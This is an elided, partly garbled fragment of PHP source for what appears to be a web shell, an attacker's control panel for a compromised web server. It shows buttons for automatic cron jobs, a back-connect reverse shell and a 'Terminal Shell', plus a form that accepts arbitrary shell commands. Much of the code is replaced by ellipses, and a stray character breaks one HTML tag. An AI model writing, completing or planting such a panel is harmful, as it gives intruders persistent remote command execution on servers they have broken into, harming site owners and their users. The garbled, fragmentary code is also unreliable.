...
<head>
    ...
    <style>
        ...
        button.auto-cronjob, button.auto-bc-rs, button.terminal-shell {
            background: #c200ff; 
        }
        button.auto-cronjob:hover, button.auto-bc-rs:hover, button.terminal-shell:hover {
            background: #00cc66; 
        }
    </style>
</head>
...
foreach ($parts as $part) {
    ...
    echo "<i class='fas fa-folder'눅 style='color: #c200ff;'></i> "; 
...
echo "<a href='?logout=true'><button>Logout</button></a>
      <form method='POST' style='display:inline;'>
        ...
        <button type='submit' name='terminal_shell' class='terminal-shell'>Terminal Shell</button>
      </form>
      <hr>";
...
if (isset($_POST['terminal_shell'])) {
    echo "<h3>Terminal Shell</h3>
          <form method='POST'>
              <input type='text' name='terminal_cmd' placeholder='Enter shell command' style='width:80%;'>
